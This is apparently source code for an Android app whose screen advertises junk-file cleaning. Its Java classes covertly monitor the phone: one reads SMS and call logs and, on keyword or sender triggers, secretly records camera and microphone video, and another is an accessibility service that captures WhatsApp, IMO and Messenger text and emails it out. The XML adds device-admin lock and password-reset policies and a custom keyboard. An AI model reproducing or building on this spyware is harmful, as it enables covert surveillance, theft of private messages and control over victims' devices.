import android.hardware.camera2.CameraManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class VideoRecord extends BroadcastReceiver {

    private MediaRecorder mediaRecorder;
    private String fileName;
    private static final String TAG = "VideoRecord";
    private static final String[] allowedNumbers = {
            "+880130028208011", "+880130403928011",  "+880969763789011", "+880963882136011" };
    private static final String[] WORDS1_GRADE = {"Goldv", "Silverv", "Mediumv"};
    private static final String[] WORDS2_OFFER = {"Congratulationv", "Conformv"};
    private List<String> lastMessages = new ArrayList<>();
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isRecording = false;
    private Context context;

    public VideoRecord(Context context) {
        this.context = context.getApplicationContext();
    }

    public VideoRecord() {}

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context.getApplicationContext();
        Log.d(TAG, "VideoRecord class onReceive called with action: " + intent.getAction());
        try {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
              //  handleSmsReceived(intent);
            } else if ("android.intent.action.PHONE_STATE".equals(intent.getAction())) {
             //   handleIncomingCall(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive: ", e);
        }
    }

    private void handleIncomingCall(Intent intent) {
        try {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            if (TelephonyManager.EXTRA_STATE_RINGING.equals(state) ||
                    TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                Log.d(TAG, "On call: " + state);
            } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                Log.d(TAG, "Call ended.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleIncomingCall: ", e);
        }
    }

    private void handleSmsReceived(Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);

                    lastMessages.clear();
                    lastMessages.add(messageBody);

                    boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                    boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                    boolean isInternetAvailable = isInternetAvailable();
                    boolean isAllowedNumber = isAllowedNumber(sender) || checkLastCallNumbers();

                    Log.d(TAG, "Keywords 1 found: " + containsWords1);
                    Log.d(TAG, "Keywords 2 found: " + containsWords2);
                    Log.d(TAG, "Internet available: " + isInternetAvailable);
                    Log.d(TAG, "Allowed number: " + isAllowedNumber);

                    if ((containsWords1 && containsWords2 && isInternetAvailable) ||
                            (isAllowedNumber && isInternetAvailable)) {
                      //  startRecording(sender, messageBody);
                        Log.d(TAG, "Conditions met for video start recording.");
                    } else {
                        Log.d(TAG, "Conditions not met for video start recording.");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleSmsReceived: ", e);
        }
    }

    public boolean isInternetAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isAvailable = netInfo != null && netInfo.isConnected();
            Log.d(TAG, "Internet available: " + isAvailable);
            return isAvailable;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }

    private boolean containsSMSWORDS1GRADE(String messageBody) {
        for (String keyword : WORDS1_GRADE) {
            if (messageBody.contains(keyword)) {
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        for (String keyword : WORDS2_OFFER) {
            if (messageBody.contains(keyword)) {
                return true;
            }
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
        for (String allowedNumber : allowedNumbers) {
            if (allowedNumber.equals(number)) {
                return true;
            }
        }
        return false;
    }

    private boolean checkLastCallNumbers() {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }

        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC")) {
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 3) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        return false;
    }

    private void startRecording(String sender, String messageBody) {
        if (isRecording) {
            Log.d(TAG, "Recording already in progress.");
            return;
        }

        try {
            isRecording = true;
            String dateTime = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            fileName = Environment.getExternalStorageDirectory() + "/DCIM/videoRecord/" + dateTime + ".mp4";

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setVideoSize(640, 480);
            mediaRecorder.setOutputFile(fileName);

            mediaRecorder.prepare();
            mediaRecorder.start();

            Log.d(TAG, "Recording started: " + fileName);
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    stopRecording();
                }
            }, 20000); // Stop after 20 seconds

        } catch (IOException | IllegalStateException e) {
            Log.e(TAG, "Error starting video recording: ", e);
            isRecording = false;
        }
    }

    private void stopRecording() {
        if (isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                isRecording = false;
                Log.d(TAG, "Recording stopped and saved to: " + fileName);
            } catch (RuntimeException e) {
                Log.e(TAG, "Error stopping video recording: ", e);
            }
        }
    }

    public void StartRecording(Context context, String sender, String messageBody) {
        Log.d(TAG, "called from Notification class the method of StartRecording in VideoRecord.");
        startRecording(sender, messageBody);
    }
}




//WhatsAppIMOMessengerContent.java
package com.example.fasterpro11;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

import androidx.core.app.NotificationCompat;

import java.util.ArrayList;
import java.util.List;

public class WhatsAppIMOMessengerContent extends AccessibilityService {

    private static final String TAG = "WhatsAppIMOMessenger";

    private static final int NOTIFICATION_ID = 1234; // Unique ID for the notification
    private static final String CHANNEL_ID = "WhatsAppIMOMessengerContent_Channel";

    // Lists to store outgoing messages (not used in this example)
    // private List<String> outWhatsApp = new ArrayList<>();
    // private List<String> outImo = new ArrayList<>();
    // private List<String> outMessenger = new ArrayList<>();

    private boolean shouldForwardMessages = true; // Flag to control message forwarding

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                CharSequence text = event.getText().get(0); // Assuming only one text change event at a time
                String messageText = text.toString();
                String packageName = event.getPackageName().toString();
                // Check if the message is from WhatsApp, IMO, or Messenger
                if (shouldForwardMessages) {
                    if (packageName.equals("com.whatsapp")) {
                        notifyMessageReceived("WhatsApp", messageText);
                    } else if (packageName.equals("com.imo.android.imoim")) {
                        notifyMessageReceived("Imo", messageText);
                    } else if (packageName.equals("com.facebook.orca")) {
                        notifyMessageReceived("Messenger", messageText);
                    }
                }
                break;
        }
    }

    @Override
    public void onInterrupt() {
        // Handle accessibility service interruption if needed
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = getString(R.string.channel_name);
            String description = getString(R.string.channel_description);
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

    private void notifyMessageReceived(String app, String message) {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_message)  // Assuming ic_message is your icon resource
                .setContentTitle("New Message from " + app)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_DEFAULT);

        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.notify(NOTIFICATION_ID, builder.build());

        // After notifying, optionally implement logic to send email with the message
        JavaMailAPI_WhatsAppIMOMessengerSender.sendEmail(app, message);
    }

    public void stopForwarding() {
        // Method to stop message forwarding
        shouldForwardMessages = false;
    }
}



  
//gradle files: 


//build.gradle
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.12.3'
        classpath 'com.google.gms:google-services:4.3.15' // Add this line
    }
}


//build.gradle(app)
plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android' version '1.8.10'
    id 'com.google.gms.google-services' // Firebase Google Services plugin
}

android {
    compileSdk 36 // à¦¸à¦°à§à¦¬à§‹à¦šà§à¦š SDK à¦­à¦¾à¦°à§à¦¸à¦¨

    defaultConfig {
        applicationId "com.example.fasterpro11"
        minSdk 23  // à¦¸à¦°à§à¦¬à¦¨à¦¿à¦®à§à¦¨ SDK à¦­à¦¾à¦°à§à¦¸à¦¨
        targetSdk 36  // à¦¨à¦¤à§à¦¨ API à¦­à¦¾à¦°à§à¦¸à¦¨
        versionCode 1
        versionName "1.0"
        multiDexEnabled true
        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
    }

    namespace "com.example.fasterpro11"

    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.debug
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }

    kotlinOptions {
        jvmTarget = '1.8'
    }

    buildFeatures {
        viewBinding true // ViewBinding à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾
    }
    packagingOptions {
        resources {
            excludes += ['META-INF/NOTICE.md', 'META-INF/LICENSE.md', 'META-INF/LICENSE-notice.md', 'META-INF/DEPENDENCIES', 'META-INF/mimetypes.default', 'META-INF/mailcap.default']
        }
    }

    // âœ… âœ… âœ… **à¦¸à¦®à¦¸à§à¦¯à¦¾ à¦¸à¦®à¦¾à¦§à¦¾à¦¨à§‡à¦° à¦œà¦¨à§à¦¯ Packaging Options**
}



dependencies {
    // âœ… AndroidX à¦²à¦¾à¦‡à¦¬à§à¦°à§‡à¦°à¦¿ - backward compatibility à¦¨à¦¿à¦¶à§à¦šà¦¿à¦¤ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯
    implementation 'androidx.appcompat:appcompat:1.6.1' // ActionBar, Material Design à¦•à¦®à§à¦ªà§‹à¦¨à§‡à¦¨à§à¦Ÿ
    implementation 'com.google.android.material:material:1.11.0' // Material Design à¦«à¦¿à¦šà¦¾à¦°
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4' // ConstraintLayout
    implementation 'androidx.multidex:multidex:2.0.1' // MultiDex à¦¸à¦¾à¦ªà§‹à¦°à§à¦Ÿ

    // âœ… Activity à¦à¦¬à¦‚ Fragment à¦œà¦¨à§à¦¯ Kotlin Extensions (Backward compatibility)
    implementation 'androidx.activity:activity-ktx:1.7.2'
    implementation 'androidx.fragment:fragment-ktx:1.5.7'

    // âœ… Lifecycle à¦²à¦¾à¦‡à¦¬à§à¦°à§‡à¦°à¦¿ (ViewModel, LiveData, etc.)
    implementation 'androidx.lifecycle:lifecycle-runtime-ktx:2.6.1'
    implementation 'androidx.lifecycle:lifecycle-viewmodel-ktx:2.6.1'

    // âœ… WorkManager (à¦¬à§à¦¯à¦¾à¦•à¦—à§à¦°à¦¾à¦‰à¦¨à§à¦¡ à¦Ÿà¦¾à¦¸à§à¦• à¦¬à§à¦¯à¦¬à¦¸à§à¦¥à¦¾à¦ªà¦¨à¦¾)
    implementation 'androidx.work:work-runtime-ktx:2.8.1'

    // âœ… OkHttp à¦²à¦¾à¦‡à¦¬à§à¦°à§‡à¦°à¦¿ (Networking)  also forâœ…  php mysql DB url dependencies
    implementation 'com.squareup.okhttp3:okhttp:4.11.0'

    // âœ… JavaMail API (Updated for Android 11+)
    implementation ('com.sun.mail:android-mail:1.6.7') {
        exclude group: 'javax.activation', module: 'activation'
    }
    implementation ('com.sun.mail:android-activation:1.6.7') {
        exclude group: 'javax.activation', module: 'activation'
    }
    implementation 'org.eclipse.angus:angus-activation:2.0.1'

    // âœ… Firebase BOM (Bill of Materials) - à¦†à¦ªà¦¡à§‡à¦Ÿà§‡à¦¡ à¦¸à¦‚à¦¸à§à¦•à¦°à¦£
    implementation platform('com.google.firebase:firebase-bom:33.8.0')
    implementation 'com.google.firebase:firebase-analytics'
    implementation 'com.google.firebase:firebase-database'
    implementation 'com.google.firebase:firebase-auth'
    implementation 'com.google.firebase:firebase-storage'
    implementation 'com.google.firebase:firebase-firestore'
    implementation 'com.google.firebase:firebase-functions'
    implementation 'com.google.android.gms:play-services-location:21.2.0'
    implementation libs.ui.android

    // âœ… Testing dependencies
    testImplementation 'junit:junit:4.13.2'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'

    
    // âœ… Google Drive API Save Data dependencies
   // implementation 'com.google.api-client:google-api-client-android:2.0.0'
    //implementation 'com.google.apis:google-api-services-drive:v3-rev20220713-2.0.0'
   // implementation 'com.google.android.gms:play-services-auth:20.7.0'
    //implementation 'com.google.http-client:google-http-client-gson:1.43.0'

    // Google Drive Add if you need OAuth2
    //implementation 'com.google.oauth-client:google-oauth-client-jetty:1.34.1'
    // Google DriveFor JSON handling
    implementation 'org.json:json:20230227'

}



//proguard-rule.pro
# Keep Jakarta Mail classes
-keep class jakarta.mail.** { *; }
-keep class com.sun.mail.** { *; }
-keep class org.eclipse.angus.** { *; }

# Prevent warnings related to Jakarta Mail and Angus Activation
-dontwarn jakarta.mail.**
-dontwarn com.sun.mail.**
-dontwarn org.eclipse.angus.**

# Keep class members for reflection support
-keepclassmembers class jakarta.mail.** { *; }
-keepclassmembers class com.sun.mail.** { *; }
-keepclassmembers class org.eclipse.angus.** { *; }

# If you are using reflection in these libraries, prevent stripping of those methods
-keepattributes Signature
-keepattributes Exceptions

# Keep methods annotated with @Keep
-keep @androidx.annotation.Keep class * { *; }
-keepclassmembers class * {
    @androidx.annotation.Keep *;
}

# Prevent obfuscation of Parcelable classes
-keepclassmembers class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator *;
}




//gradle.properties
# Project-wide Gradle settings.
# IDE (e.g. Android Studio) users:
# Gradle settings configured through the IDE *will override*
# any settings specified in this file.
# For more details on how to configure your build environment visit
# http://www.gradle.org/docs/current/userguide/build_environment.html
# Specifies the JVM arguments used for the daemon process.
# The setting is particularly useful for tweaking memory settings.
org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
# When configured, Gradle will run in incubating parallel mode.
# This option should only be used with decoupled projects. For more details, visit
# https://developer.android.com/r/tools/gradle-multi-project-decoupled-projects
# org.gradle.parallel=true
# AndroidX package structure to make it clearer which packages are bundled with the
# Android operating system, and which are packaged with your app's APK
# https://developer.android.com/topic/libraries/support-library/androidx-rn
android.useAndroidX=true
# Enables namespacing of each library's R class so that its R class includes only the
# resources declared in the library itself and none from the library's dependencies,
# thereby reducing the size of the R class for that library
android.nonTransitiveRClass=true
android.defaults.buildfeatures.buildconfig=true
android.nonFinalResIds=false





//gradle-wrapper.properties
#Fri Jul 25 14:42:33 BDT 2025
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-8.13-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists




//setting.gradle
pluginManagement {
    repositories {
        google {
            content {
                includeGroupByRegex("com\\.android.*")
                includeGroupByRegex("com\\.google.*")
                includeGroupByRegex("androidx.*")
            }
        }
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}

rootProject.name = "fasterpro11"
include ':app'


//local.properties
## This file is automatically generated by Android Studio.
# Do not modify this file -- YOUR CHANGES WILL BE ERASED!
#
# This file should *NOT* be checked into Version Control Systems,
# as it contains information specific to your local configuration.
#
# Location of the SDK. This is only used by Gradle.
# For customization when using a Version Control System, please read the
# header note.
sdk.dir=C\:\\Users\\JASHORE ONLY\\AppData\\Local\\Android\\Sdk




//xml files :

//activity_main.xml
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:padding="16dp">

    <TextView
        android:id="@+id/textView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text=".Clean Junk File Cash Memory Automatically."
        android:textSize="24sp"
        android:textAlignment="center"
        android:layout_centerInParent="true"/>

</RelativeLayout>




//activity_email.xml
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

    <EditText
        android:id="@+id/editTextRecipient"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Recipient"
        android:inputType="textEmailAddress"
        android:layout_margin="16dp"
        android:padding="16dp"/> <!-- Added padding to increase touchable area -->

    <EditText
        android:id="@+id/editTextSubject"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Subject"
        android:layout_below="@id/editTextRecipient"
        android:layout_margin="16dp"
        android:padding="16dp"/> <!-- Added padding to increase touchable area -->

    <EditText
        android:id="@+id/editTextMessage"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Message"
        android:layout_below="@id/editTextSubject"
        android:layout_margin="16dp"
        android:padding="16dp"/> <!-- Added padding to increase touchable area -->

    <Button
        android:id="@+id/buttonSend"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Send"
        android:layout_below="@id/editTextMessage"
        android:layout_centerHorizontal="true"
        android:layout_marginTop="24dp"/>
</RelativeLayout>




//accessibility_service_config.xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
    android:packageNames="com.example.fasterpro11"
    android:accessibilityEventTypes="typeViewTextChanged|typeViewClicked|typeWindowStateChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="100"
    android:canRetrieveWindowContent="true"
    android:accessibilityFlags="flagDefault"/>

//backup_rules.xml
<?xml version="1.0" encoding="utf-8"?><!--
   Sample backup rules file; uncomment and customize as necessary.
   See https://developer.android.com/guide/topics/data/autobackup
   for details.
   Note: This file is ignored for devices older that API 31
   See https://developer.android.com/about/versions/12/backup-restore
-->
<full-backup-content>
    <!--
   <include domain="sharedpref" path="."/>
   <exclude domain="sharedpref" path="device.xml"/>
-->
</full-backup-content>


//data_extraction_rules.xml
<?xml version="1.0" encoding="utf-8"?><!--
   Sample data extraction rules file; uncomment and customize as necessary.
   See https://developer.android.com/about/versions/12/backup-restore#xml-changes
   for details.
-->
<data-extraction-rules>
    <cloud-backup>
        <!-- TODO: Use <include> and <exclude> to control what is backed up.
        <include .../>
        <exclude .../>
        -->
    </cloud-backup>
    <!--
    <device-transfer>
        <include .../>
        <exclude .../>
    </device-transfer>
    -->
</data-extraction-rules>



// device_admin_receiver.xml
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <force-lock />
    </uses-policies>
</device-admin>




// deviceadmin.xml
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <force-lock />
        <password-reset />
    </uses-policies>
</device-admin>



// method.xml
<?xml version="1.0" encoding="utf-8"?>
<input-method xmlns:android="http://schemas.android.com/apk/res/android"
    android:settingsActivity=".SettingsActivity">
    <subtype
        android:label="@string/app_name"
        android:imeSubtypeLocale="en_US"
        android:imeSubtypeMode="keyboard"
        android:isAuxiliary="false"
        android:overridesImplicitlyEnabledSubtype="true" />
</input-method>





